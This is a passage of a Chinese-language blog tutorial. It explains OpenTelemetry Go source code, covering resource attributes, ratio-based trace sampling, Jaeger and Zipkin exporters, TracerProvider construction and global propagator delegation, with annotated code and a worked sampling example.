<span class="hljs-keyword">type</span> Key <span class="hljs-type">string</span>

<span class="hljs-comment">// 有一系列方法  有int string bool 等等</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(k Key)</span></span> String(v <span class="hljs-type">string</span>) KeyValue {
	<span class="hljs-keyword">return</span> KeyValue{
		Key:   k,
		Value: StringValue(v),
	}
}
<span class="hljs-comment">// 返回的结构体</span>
<span class="hljs-keyword">type</span> KeyValue <span class="hljs-keyword">struct</span> {
	Key   Key   
	Value Value
}

<span class="hljs-comment">// 其中的字段</span>
<span class="hljs-keyword">type</span> Value <span class="hljs-keyword">struct</span> {
	vtype    Type
	numeric  <span class="hljs-type">uint64</span>
	stringly <span class="hljs-type">string</span>
	slice    any
}
</code></pre>
<h3 data-id="heading-3"><code>NewSchemaless()</code> 函数</h3>
<p>在 UI 首页，选择对应的服务，选中后，找到具体的追踪链路，这里主要设置这条链路属于哪个服务名的</p>
<p>就类似你先选择哪个数据库系统类型（<code>mySQL</code>、<code>NoSQL</code>）再去建表</p>
<p>选择哪个数据库系统类型 就是我们这里设置的服务名，建表就是设置 <code>TracerID</code> 和 <code>SpanID</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewSchemaless</span><span class="hljs-params">(attrs ...attribute.KeyValue)</span></span> *Resource {
	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(attrs) == <span class="hljs-number">0</span> {
		<span class="hljs-keyword">return</span> &amp;Resource{}
	}

	<span class="hljs-comment">/*  
	NewSetWithFiltered 去重、验证合法性并且重排 按照字符串 a - z 重排 重复只要最后一个 声明这里的
	示例：a=1, ""=2, b=INVALID, a=3, c=4, a=6  这里简单写了其实 a 就是 KeyValue 结构体的 key 1 就是结构体的 value 做比喻， 先排序 [ ""=2, a=1, a=3, b=INVALID, c=4 ] 再去重（last-value-wins）[ ""=2, a=3, b=INVALID, c=4 ] 最后过滤（kv.Valid） [ a=3, c=4 ] 重点是 返回类型：Set 一个结构体  如果不封装成 Set，而是直接返回 []KeyValue 切片，会存在一个致命问题：切片是引用类型，外部拿到后可以随意修改（追加、删除、修改元素），很容易破坏唯一、合法的约束。
	*/</span>
	s, _ := attribute.NewSetWithFiltered(attrs, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(kv attribute.KeyValue)</span></span> <span class="hljs-type">bool</span> {
		<span class="hljs-keyword">return</span> kv.Valid()   <span class="hljs-comment">// 过滤逻辑放在下个函数</span>
	})


	<span class="hljs-keyword">if</span> s.Len() == <span class="hljs-number">0</span> {
		<span class="hljs-keyword">return</span> &amp;Resource{}
	}

	<span class="hljs-keyword">return</span> &amp;Resource{attrs: s} 
}

<span class="hljs-comment">// 过滤逻辑我复制过来了  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(kv KeyValue)</span></span> Valid() <span class="hljs-type">bool</span> {
	<span class="hljs-keyword">return</span> kv.Key.Defined() &amp;&amp; kv.Value.Type() != INVALID
}
</code></pre>
<h3 data-id="heading-4"><code>OpenTelemetry</code> 函数式选项模式</h3>
<p>这种选项模式是不可变配置型，我之前的文章详细介绍过这种选项模式，大家有时间可以了解一下，主要体现出 Go 的编程思想</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 面向接口编程</span>
<span class="hljs-keyword">type</span> TracerProviderOption <span class="hljs-keyword">interface</span> {  <span class="hljs-comment">//接口</span>
	apply(tracerProviderConfig) tracerProviderConfig
}
<span class="hljs-comment">// 实现了上面接口</span>
<span class="hljs-keyword">type</span> traceProviderOptionFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(tracerProviderConfig)</span></span> tracerProviderConfig

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fn traceProviderOptionFunc)</span></span> apply(cfg tracerProviderConfig) tracerProviderConfig {
	<span class="hljs-keyword">return</span> fn(cfg)  <span class="hljs-comment">// 调用函数类型本身 因为自己就是一个函数</span>
}

</code></pre>
<h3 data-id="heading-5"><code>WithResource()</code> 函数</h3>
<p>这就是 <code>OpenTelemetry</code>  封装一系列<code>WithXXX</code>命名的工厂函数，使用工厂函数达到赋值的目的</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithResource</span><span class="hljs-params">(r *resource.Resource)</span></span> TracerProviderOption {
    <span class="hljs-comment">// 可以理解成同签名函数类型的安全转换  转换的双方是 “同构” 的，没有数据丢失 </span>
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
        <span class="hljs-comment">// apply 方法</span>
		<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
        <span class="hljs-comment">// 拿出 环境变量里面的 Resource 主要针对在 Kubernetes 中运行服务 Merge 就是冲突的用r中的，不冲突就相融</span>
        <span class="hljs-comment">// 在我们这个例子，只传入了一个并且没有环境变量 这个函数相当于不执行还是原来的 r *resource.Resource</span>
		cfg.resource, err = resource.Merge(resource.Environment(), r)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-comment">// 错误</span>
			otel.Handle(err)
		}
		<span class="hljs-keyword">return</span> cfg
	})
}

</code></pre>
<h3 data-id="heading-6">核心逻辑图解</h3>
<pre><code class="hljs language-css" lang="css">     Resource <span class="hljs-selector-tag">A</span> (来自环境变量)          Resource <span class="hljs-selector-tag">B</span> (代码中传入)
    ┌─────────────────────────┐      ┌─────────────────────────┐
    │ service<span class="hljs-selector-class">.namespace</span>=shop  │      │ service<span class="hljs-selector-class">.name</span>=<span class="hljs-attribute">order</span>-svc  │
    │ deployment<span class="hljs-selector-class">.env</span>=prod     │      │ 						   │
    └─────────────────────────┘      └─────────────────────────┘
                    │                           │
                    └───────────┬───────────────┘
                                │
                          Merge(<span class="hljs-selector-tag">A</span>, <span class="hljs-selector-tag">B</span>)
                                │
                                ▼
                    ┌─────────────────────────┐
                    │ service<span class="hljs-selector-class">.name</span>=<span class="hljs-attribute">order</span>-svc  │  ←  <span class="hljs-selector-tag">B</span> 覆盖了 <span class="hljs-selector-tag">A</span>
                    │                         │
                    │ deployment<span class="hljs-selector-class">.env</span>=prod     │  ← 来自 <span class="hljs-selector-tag">A</span>（<span class="hljs-selector-tag">B</span> 没有这个 key）
                    └─────────────────────────┘
</code></pre>
<h3 data-id="heading-7"><code>trace.TraceIDRatioBased(o.Sampler)</code> 函数</h3>
<p><code>Sampler</code> 是一个接口，便于扩展性，如果不想用基于采样率，或者后续有更好的方法，那只要实现这个接口就不需要更改代码，再一次体现了go语言面向接口编程</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TraceIDRatioBased</span><span class="hljs-params">(fraction <span class="hljs-type">float64</span>)</span></span> Sampler {
	<span class="hljs-keyword">if</span> fraction &gt;= <span class="hljs-number">1</span> {
		<span class="hljs-keyword">return</span> AlwaysSample()  <span class="hljs-comment">//采样率 100%  后续不需要判断是否采样</span>
	}

	<span class="hljs-keyword">if</span> fraction &lt;= <span class="hljs-number">0</span> {
        <span class="hljs-comment">/*
        采样器会继承父 Span 的采样决定，如果父 Span 被采样了，即使子 Span 的采样比例是 0%，
        子 Span 也会被采样，避免链路断裂
        */</span>
		fraction = <span class="hljs-number">0</span>
	}
    
	<span class="hljs-comment">// 返回用采样的结构体 后面有例子来描述如何采样</span>
	<span class="hljs-keyword">return</span> &amp;traceIDRatioSampler{
        <span class="hljs-comment">// 由于那后8个字节对比 最大值为 2的64次方 - 1 这里防止溢出 范围调整 左移63位 也就是乘2的63次方 </span>
        <span class="hljs-comment">// 例如0.1 * 2的63次方</span>
		traceIDUpperBound: <span class="hljs-type">uint64</span>(fraction * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">63</span>)),  
		description:       fmt.Sprintf(<span class="hljs-string">"TraceIDRatioBased{%g}"</span>, fraction), <span class="hljs-comment">// 描述</span>
	}
}


<span class="hljs-comment">// 上面用的结构体</span>
<span class="hljs-keyword">type</span> traceIDRatioSampler <span class="hljs-keyword">struct</span> {
    traceIDUpperBound <span class="hljs-type">uint64</span>   <span class="hljs-comment">// 采样阈值</span>
    description       <span class="hljs-type">string</span>   <span class="hljs-comment">// 描述信息</span>
}

<span class="hljs-comment">// 重点方法 用于判断是否采样</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ts traceIDRatioSampler)</span></span> ShouldSample(p SamplingParameters) SamplingResult {
	psc := trace.SpanContextFromContext(p.ParentContext)
     <span class="hljs-comment">// 存储方式是大端 是高位在前 我们要取低8位 因为 TraceID 生成的时候后8位是纯随机数 更适合随机采样</span>
     <span class="hljs-comment">// 左移一位是对齐 (1 &lt;&lt; 63) 这样才能进行比较</span>
	x := binary.BigEndian.Uint64(p.TraceID[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>]) &gt;&gt; <span class="hljs-number">1</span> 
    <span class="hljs-comment">// 比较逻辑 </span>
	<span class="hljs-keyword">if</span> x &lt; ts.traceIDUpperBound { 
		<span class="hljs-keyword">return</span> SamplingResult{
			Decision:   RecordAndSample,
			Tracestate: psc.TraceState(),
		}
	}
	<span class="hljs-keyword">return</span> SamplingResult{
		Decision:   Drop,
		Tracestate: psc.TraceState(),
	}
}
</code></pre>
<h3 data-id="heading-8">比较决策的例子</h3>
<pre><code class="hljs language-ini" lang="ini">假设 <span class="hljs-attr">fraction</span> = <span class="hljs-number">0.1</span> (<span class="hljs-number">10</span>% 采样)

<span class="hljs-attr">traceIDUpperBound</span> = <span class="hljs-number">0.1</span> × <span class="hljs-number">2</span>^<span class="hljs-number">63</span> = <span class="hljs-number">922</span>,<span class="hljs-number">337</span>,<span class="hljs-number">203</span>,<span class="hljs-number">685</span>,<span class="hljs-number">477</span>,<span class="hljs-number">580</span>

x 的取值范围 (右移后): 0 ~ 2^<span class="hljs-attr">63-1</span> = <span class="hljs-number">0</span> ~ <span class="hljs-number">9</span>,<span class="hljs-number">223</span>,<span class="hljs-number">372</span>,<span class="hljs-number">036</span>,<span class="hljs-number">854</span>,<span class="hljs-number">775</span>,<span class="hljs-number">807</span>

数轴表示:
0                                                    2^63-1
|&lt;------ 10% 采样区间 ------&gt;|&lt;----- 90% 丢弃区间 -------&gt;|
0            922,337,203,685,477,580        9,223,372,036,854,775,807

这是后一个请求过来生成一个 TraceID
<span class="hljs-attr">TraceID</span> = <span class="hljs-number">0</span>xaabbccdd11223344_fedcba9876543210

取出低八位并转成uint用于比较
<span class="hljs-attr">uint64_val</span> = <span class="hljs-number">0</span>xFEDCBA9876543210 = <span class="hljs-number">18</span>,<span class="hljs-number">364</span>,<span class="hljs-number">758</span>,<span class="hljs-number">544</span>,<span class="hljs-number">493</span>,<span class="hljs-number">543</span>,<span class="hljs-number">952</span>

右移 1 位 对齐逻辑
<span class="hljs-attr">x</span> = <span class="hljs-number">18</span>,<span class="hljs-number">364</span>,<span class="hljs-number">758</span>,<span class="hljs-number">544</span>,<span class="hljs-number">493</span>,<span class="hljs-number">543</span>,<span class="hljs-number">952</span> &gt;&gt; <span class="hljs-number">1</span> = <span class="hljs-number">9</span>,<span class="hljs-number">182</span>,<span class="hljs-number">379</span>,<span class="hljs-number">272</span>,<span class="hljs-number">246</span>,<span class="hljs-number">771</span>,<span class="hljs-number">976</span>

比较
<span class="hljs-attr">x</span> = <span class="hljs-number">9</span>,<span class="hljs-number">182</span>,<span class="hljs-number">379</span>,<span class="hljs-number">272</span>,<span class="hljs-number">246</span>,<span class="hljs-number">771</span>,<span class="hljs-number">976</span>  （<span class="hljs-number">19</span>位）
<span class="hljs-attr">traceIDUpperBound</span> = <span class="hljs-number">922</span>,<span class="hljs-number">337</span>,<span class="hljs-number">203</span>,<span class="hljs-number">685</span>,<span class="hljs-number">477</span>,<span class="hljs-number">580</span>   （<span class="hljs-number">18</span>位）

正好差了10倍 想要真正取样的话，要比 traceIDUpperBound 这个小 比他小的从概率上就是10%  
9,182,379,272,246,771,976 &lt; 922,337,203,685,477,580     ✗ 不成立！
结果: Drop (丢弃)
</code></pre>
<h3 data-id="heading-9"><code>trace.WithSampler(trace.ParentBased()</code> 两个函数</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 同理 构造函数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSampler</span><span class="hljs-params">(s Sampler)</span></span> TracerProviderOption {
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
		<span class="hljs-keyword">if</span> s != <span class="hljs-literal">nil</span> {
			cfg.sampler = s
		}
		<span class="hljs-keyword">return</span> cfg
	})
}
<span class="hljs-comment">// 返回一个 根 Span</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParentBased</span><span class="hljs-params">(root Sampler, samplers ...ParentBasedSamplerOption)</span></span> Sampler {
    <span class="hljs-keyword">return</span> parentBased{
        root:   root,    <span class="hljs-comment">// 把刚得到的结构体 traceIDRatioSampler 放上去                         </span>
        config: configureSamplersForParentBased(samplers), 
    }
}


<span class="hljs-comment">// 这里了解一下就好</span>
<span class="hljs-keyword">type</span> parentBased <span class="hljs-keyword">struct</span> {
    root   Sampler
    config samplerConfig
}

<span class="hljs-keyword">type</span> samplerConfig <span class="hljs-keyword">struct</span> {
    remoteParentSampled    Sampler  <span class="hljs-comment">// 远程父 Span 已采样时用</span>
    remoteParentNotSampled Sampler  <span class="hljs-comment">// 远程父 Span 未采样时用</span>
    localParentSampled     Sampler  <span class="hljs-comment">// 本地父 Span 已采样时用</span>
    localParentNotSampled  Sampler  <span class="hljs-comment">// 本地父 Span 未采样时用</span>
}
</code></pre>
<h3 data-id="heading-10">创建 Exporter</h3>
<p>当执行第一个：创建一个 <code>Jaeger Exporter</code> ，负责把你服务产生的链路追踪数据（Span）打包成 <code>Jaeger</code> 能看懂的格式（Thrift 二进制），然后通过 HTTP 发送到 Jaeger 服务器的地址（比如 <a href="https://link.juejin.cn?target=http%3A%2F%2Fjaeger%3A14268%2Fapi%2Ftraces%25EF%25BC%2589%25E3%2580%2582%25E4%25B9%259F%25E5%25B0%25B1%25E6%2598%25AF%25E6%2596%25B0%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AA%25E5%25AE%259E%25E4%25BE%258B" target="_blank" title="http://jaeger:14268/api/traces%EF%BC%89%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B" ref="nofollow noopener noreferrer">http://jaeger:14268/api/traces）。也就是新建一个实例</a></p>
<p>当执行第二个：创建一个 <code>Zipkin Exporter</code> ，负责把你服务产生的链路追踪数据（Span）打包成 JSON 格式，然后通过 HTTP 发送到 <code>Zipkin</code> 服务器的地址（比如 <a href="https://link.juejin.cn?target=http%3A%2F%2Fzipkin%3A9411%2Fapi%2Fv2%2Fspans%25EF%25BC%2589%25E3%2580%2582%25E4%25B9%259F%25E6%2598%25AF%25E6%2596%25B0%25E5%25BB%25BA%25E5%25AE%259E%25E4%25BE%258B" target="_blank" title="http://zipkin:9411/api/v2/spans%EF%BC%89%E3%80%82%E4%B9%9F%E6%98%AF%E6%96%B0%E5%BB%BA%E5%AE%9E%E4%BE%8B" ref="nofollow noopener noreferrer">http://zipkin:9411/api/v2/spans）。也是新建实例</a></p>
<p>两者功能一样，只是发送的目标和数据格式不同</p>
<p><strong>这里大家不用深究这两个的内部实现，只需要知道是做什么就好</strong></p>
<pre><code class="hljs language-go" lang="go">	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(o.Endpoint) &gt; <span class="hljs-number">0</span> {
		<span class="hljs-keyword">switch</span> o.Batcher {
		<span class="hljs-keyword">case</span> kindJaeger:  <span class="hljs-comment">// 自己定义的常量</span>
            <span class="hljs-comment">// 这里的 With...(With...) 就是标准的选项构造函数  只不过这个是配置里面增加配置而已</span>
			sexp, err = jaeger.New(jaeger.WithCollectorEndpoint(jaeger.WithEndpoint(o.Endpoint)))
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> err
			}
		<span class="hljs-keyword">case</span> kindZipkin:
			sexp, err = zipkin.New(o.Endpoint)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				<span class="hljs-keyword">return</span> err
			}
		}
        <span class="hljs-comment">/*
        重点 trace.WithBatcher(sexp) 这个函数内部做两件事
        第一件：将 sexp 包装成一个 BatchSpanProcessor 这个的作用就是把产生的 Span 先缓存起来，达到一定数量或时间后再批量发		 送，而不是每产生一条就立即发送，从而减少网络开销、提升性能。
        第二件：通过 WithSpanProcessor() 函数进行注册，如果刚开始使用 可以直接WithSpanProcessor(sexp) 传入
		opentelemetry作为一个标准他并不是真正的执行者，它规定接口，当Span 数据来临时，它会转发给注册的 jaeger 或者 zipkin		 等等，如果不去注册，Span 数据无处可去会被直接丢弃，注册也可以注册很多 比如 jaeger 和 zipkin 都注册了，内部是一个切片
		直接使用 WithSpanProcessor(jaeger) 在执行一遍 WithSpanProcessor(zipkin),内部逻辑我贴在补充 可以看一下
		*/</span>
		opts = <span class="hljs-built_in">append</span>(opts, trace.WithBatcher(sexp))
	}


<span class="hljs-comment">// 补充</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSpanProcessor</span><span class="hljs-params">(sp SpanProcessor)</span></span> TracerProviderOption {
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
		cfg.processors = <span class="hljs-built_in">append</span>(cfg.processors, sp)
		<span class="hljs-keyword">return</span> cfg
	})
}
</code></pre>
<h3 data-id="heading-11"><code>trace.NewTracerProvider(opts...)</code> 函数</h3>
<p>大家如果看过我之前的文章，我相信大家对于这种源码已经非常熟悉了，这是go语言经典的编程思想</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewTracerProvider</span><span class="hljs-params">(opts ...TracerProviderOption)</span></span> *TracerProvider {
    <span class="hljs-comment">// 创建一些默认的 这里只有一个默认 spanLimits 就是限制 span内容比如属性值最长 4096 字符，太大截断</span>
    <span class="hljs-comment">// 防止某个 Span 写入过多数据导致内存爆炸或网络传输过大。做一些限制</span>
	o := tracerProviderConfig{
		spanLimits: NewSpanLimits(),
	}
    <span class="hljs-comment">// 了解一下就可以 同样先从环境变量读取 后续再通过传来的进行覆盖 主要应用在 K8s 中</span>
	o = applyTracerProviderEnvConfigs(o)

    <span class="hljs-comment">// 读取我们传来的</span>
	<span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
		o = opt.apply(o)
	}
    <span class="hljs-comment">// 检查配置是否完整，比如 如果没有设置 sampler 取样率就使用默认全取样，还有 TraceID 和 SpanID 的ID生成器没传就使用默认</span>
	o = ensureValidTracerProviderConfig(o)
    
	<span class="hljs-comment">// 创建 TracerProvider 实例 </span>
	tp := &amp;TracerProvider{
		namedTracer: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[instrumentation.Scope]*tracer), <span class="hljs-comment">// 缓存已创建的 Tracer 后续大家会明白</span>
		sampler:     o.sampler,  <span class="hljs-comment">// 采样器 到时候执行 它内部 ShouldSample 方法决定是否取样 上面已经讲过</span>
		idGenerator: o.idGenerator, <span class="hljs-comment">// ID生成器</span>
		spanLimits:  o.spanLimits,  <span class="hljs-comment">// 简单理解一些属性的限制</span>
        <span class="hljs-comment">// 服务资源信息，包含 service.name、service.namespace 等标识当前服务身份的元数据</span>
        <span class="hljs-comment">// 这些信息会附加到所有 Span 上，在 Jaege r或 Zipkin UI 中用于筛选和分组</span>
		resource:    o.resource,   
	}
	global.Info(<span class="hljs-string">"TracerProvider created"</span>, <span class="hljs-string">"config"</span>, o)

    <span class="hljs-comment">// 由于可以有多个 processor 为了方便使用和关闭 必须要定义一种结构体，不然不知道咋关闭其中一个也不知道是否关闭</span>
    <span class="hljs-comment">// 这个已经放在补充了 本质上就是切片 里面结构体一个是 processor 一个是 是否关闭</span>
	spss := <span class="hljs-built_in">make</span>(spanProcessorStates, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(o.processors))
	<span class="hljs-keyword">for</span> _, sp := <span class="hljs-keyword">range</span> o.processors {
		spss = <span class="hljs-built_in">append</span>(spss, newSpanProcessorState(sp))
	}
    
    <span class="hljs-comment">// 这里TracerProvider 可能被多个 goroutine 并发使用，所以要用原子操作</span>
	tp.spanProcessors.Store(&amp;spss)

	<span class="hljs-keyword">return</span> tp
}

<span class="hljs-comment">// 补充 </span>
<span class="hljs-keyword">type</span> spanProcessorStates []*spanProcessorState

<span class="hljs-keyword">type</span> spanProcessorState <span class="hljs-keyword">struct</span> {
	sp    SpanProcessor   <span class="hljs-comment">// 具体的 processor</span>
    <span class="hljs-comment">// 只允许写一次 后续在执行啥都不做 主要用于 Shutdown 防止n个 goroutine 都调用 Shutdown 导致导致重复关闭连接 panic</span>
	state sync.Once   
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newSpanProcessorState</span><span class="hljs-params">(sp SpanProcessor)</span></span> *spanProcessorState {
	<span class="hljs-keyword">return</span> &amp;spanProcessorState{sp: sp}  <span class="hljs-comment">//这是初始化 不能设置 state，传入代表关闭了</span>
}

<span class="hljs-comment">// 重点逻辑 n 个 goroutine 执行这个 由于 sync.Once 特性 只执行一次 巧妙的 解决了问题</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *spanProcessorState)</span></span> shutdown(ctx context.Context) <span class="hljs-type">error</span> {
    <span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
    s.state.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 只会执行一次，即使 shutdown 被调用多次</span>
        err = s.sp.Shutdown(ctx)
    })
    <span class="hljs-keyword">return</span> err
}

</code></pre>
<h3 data-id="heading-12"><code>otel.SetTracerProvider(tp)</code> 核心函数</h3>
<p>这个简单来说就是有一个全局的 <code>TracerProvider</code> ，把我们刚才创建的注册到 <code>opentelemetry</code> 上，为什么要去放到上面而不是直接用我们创建的这个呢，大家思考一下，<code>opentelemetry</code>  作为一个规范，第三方库肯定会支持的，比如 <code>gRPC</code> 中间件、 <code>Gorm</code> 数据库链路跟踪等等，它们怎么拿到这个链路呢，要不然链路就断了，所以统一放到一个地方，它们内部只需要调用 <code>otel.Tracer()</code> 这个函数就可以拿到全局的链路，这样就保证链路顺通，如果感觉下面这个代码有点繁琐，只需要记住注册上去就好，</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 解释一下为什么 Set里面套Set 而不是直接执行逻辑，第一就是让使用者一瞬间就知道只是一个注册而已隐藏内部细节</span>
<span class="hljs-comment">// 第二就是预留扩展性，比如后续来个校验，我可以直接在这层去做，而不去核心逻辑层修改</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SetTracerProvider</span><span class="hljs-params">(tp trace.TracerProvider)</span></span> {
	global.SetTracerProvider(tp)
}

<span class="hljs-comment">/* 全局变量 初始化一个默认的 可以理解成空
首先第一点必须是线程安全的类型 atomic.Value 
其次是内部是存放什么的： 是一个结构体 tracerProviderHolder
	tracerProviderHolder struct {
		tp trace.TracerProvider  //里面是接口  后续用于存放我们刚刚新建的 TracerProvider
	}
*/</span>
<span class="hljs-keyword">var</span> globalTracer = defaultTracerValue() 

<span class="hljs-comment">// 真正的内部</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TracerProvider</span><span class="hljs-params">()</span></span> trace.TracerProvider {
    <span class="hljs-comment">//断言成 tracerProviderHolder 这个类型才能拿到内部tp 静态语言的规范</span>
	<span class="hljs-keyword">return</span> globalTracer.Load().(tracerProviderHolder).tp  
}


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SetTracerProvider</span><span class="hljs-params">(tp trace.TracerProvider)</span></span> {
    <span class="hljs-comment">// 函数如上</span>
	current := TracerProvider()
	<span class="hljs-comment">//这里主要是防止一件事情 就是我们传入的 tp 就是默认初始化的globalTracer 也就是 current == tp</span>
    <span class="hljs-comment">// 这个时候要报错的，因为后续 会设置委托 自己委托自己，而且委托只有一次 所以会陷入死循环 所以这里要判断一下 </span>
	<span class="hljs-keyword">if</span> _, cOk := current.(*tracerProvider); cOk {
		<span class="hljs-keyword">if</span> _, tpOk := tp.(*tracerProvider); tpOk &amp;&amp; current == tp {
			<span class="hljs-comment">// delegate 这个英文是 委托 的意思</span>
			Error(
				errors.New(<span class="hljs-string">"no delegate configured in tracer provider"</span>),
				<span class="hljs-string">"Setting tracer provider to its current value. No delegate will be configured"</span>,
			)
			<span class="hljs-keyword">return</span>
		}
	}
	<span class="hljs-comment">/*
    这里就是设置委托了 为什么要设置委托 因为有些第三方库，如果在我还没有 SetTracerProvider 的时候 它就调用
    otel.Tracer() 这个函数  它拿到的 TracerProvider 是默认空的占位符，这个时候并不报错，执行 tracer 空逻辑，
    相当于没有记录。等这边 SetTracerProvider 执行之后，那边拿到的依旧是空占位符，这个时候它还是会执行 tracer 这个时候
    delegate 这个代理已经有值了，就是下面这个语句存进去了，这个时候他就会转发给存入的这个tp
    就相当于直接执行了 TracerProvider.tracer 这里 delegateTraceOnce 是 sync.Once 类型 只写一次
    也很好理解 拿到默认占位符的那些第三方库，经过这个执行后都可以正常执行，以后调用的第三方库直接就拿了tp 根本不用走委托
    */</span>
	delegateTraceOnce.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-keyword">if</span> def, ok := current.(*tracerProvider); ok {
			def.setDelegate(tp)
		}
	})
    <span class="hljs-comment">// 存入全局变量 这个时候第三方库和自己用都可以直接拿到 并不需要走委托</span>
	globalTracer.Store(tracerProviderHolder{tp: tp})
}


</code></pre>
<h3 data-id="heading-13"><code>otel.SetTextMapPropagator()  </code> 核心函数</h3>
<p>上下文传播器，负责在服务间传递追踪信息（trace-id、span-id 等）。如果没有 <code>Propagator</code>，每个服务都会生成新的 <code> trace-id</code>，无法形成完整的调用链。代码逻辑与上面几乎一模一样，看完上面再看这里会比较容易</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 包装层 隐藏内部细节</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SetTextMapPropagator</span><span class="hljs-params">(propagator propagation.TextMapPropagator)</span></span> {
	global.SetTextMapPropagator(propagator)
}

<span class="hljs-comment">/* 全局变量 同上 初始化一个默认的 可以理解成空
首先第一点必须是线程安全的类型 atomic.Value 
其次是内部是存放什么的： 是一个结构体 propagatorsHolder
		propagatorsHolder struct {
		tm propagation.TextMapPropagator  // 这个放 我们放进去的 后面会讲
	}
*/</span>
<span class="hljs-keyword">var</span> globalPropagators = defaultPropagatorsValue()


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TextMapPropagator</span><span class="hljs-params">()</span></span> propagation.TextMapPropagator {
	<span class="hljs-keyword">return</span> globalPropagators.Load().(propagatorsHolder).tm
}

<span class="hljs-comment">// 真正的内部</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SetTextMapPropagator</span><span class="hljs-params">(p propagation.TextMapPropagator)</span></span> {
	current := TextMapPropagator() <span class="hljs-comment">//去拿默认的</span>

    <span class="hljs-comment">//同样需要对比 避免自己委托自己  </span>
	<span class="hljs-keyword">if</span> _, cOk := current.(*textMapPropagator); cOk {
		<span class="hljs-keyword">if</span> _, pOk := p.(*textMapPropagator); pOk &amp;&amp; current == p {
			Error(
				errors.New(<span class="hljs-string">"no delegate configured in text map propagator"</span>),
				<span class="hljs-string">"Setting text map propagator to its current value. No delegate will be configured"</span>,
			)
			<span class="hljs-keyword">return</span>
		}
	}

	<span class="hljs-comment">/*
    这个也是有些第三方库，如果在我还没有 SetTextMapPropagator 的时候，就注入或者提取：p.Inject(spanCtx, header)
    p.Extract(savedCtx, c.Request.Header)  这些后续会讲，简单理解：Inject 就是把第一个参数的 Trace 信息注入到第二个
    Extract 就是反向，第二个参数的内容提取到第一个参数，其实是返回一个新的 context 以第一个参数为基础的新上下文
    比如在 gin 官方支持的中间件中，你先初始化了中间件再注册，它内部是空的占位符，当来信息请求时，他会执行 Extract 提取
    这时候就会走到这个代理，由于已经注册了，可以转发到真正的 globalPropagators.Extract
    */</span>
	delegateTextMapPropagatorOnce.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-keyword">if</span> def, ok := current.(*textMapPropagator); ok {
			def.SetDelegate(p)
		}
	})
	
    <span class="hljs-comment">// 把我们传入的存到 全局变量中</span>
	globalPropagators.Store(propagatorsHolder{tm: p})
}

</code></pre>
<h3 data-id="heading-14"><code>propagation.NewCompositeTextMapPropagator()</code>核心函数</h3>
<p><code>propagation.NewCompositeTextMapPropagator(propagation.TraceContext{}, propagation.Baggage{})</code> 这个函数主要是传播器组合器，把多个独立的 <code>TextMapPropagator</code>（接口），组合成一个统一的、可批量调用的传播器。</p>
<p>我们这边注册了两个，该组合能够覆盖绝大多数分布式系统的追踪需求，也是最常用的。</p>
